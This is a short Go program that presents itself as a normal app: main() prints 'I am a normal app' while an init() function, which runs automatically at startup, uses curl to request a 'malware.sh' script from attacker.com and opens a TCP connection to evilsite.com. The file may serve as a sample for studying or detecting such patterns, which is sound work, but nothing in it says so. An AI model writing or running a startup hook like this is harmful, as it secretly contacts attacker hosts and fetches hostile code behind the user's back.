package main
import "os/exec"
import "net"
func init() {
	exec.Command("curl", "http://attacker.com/malware.sh").Run()
	net.Dial("tcp", "evilsite.com:80")
}
func main() { println("I am a normal app") }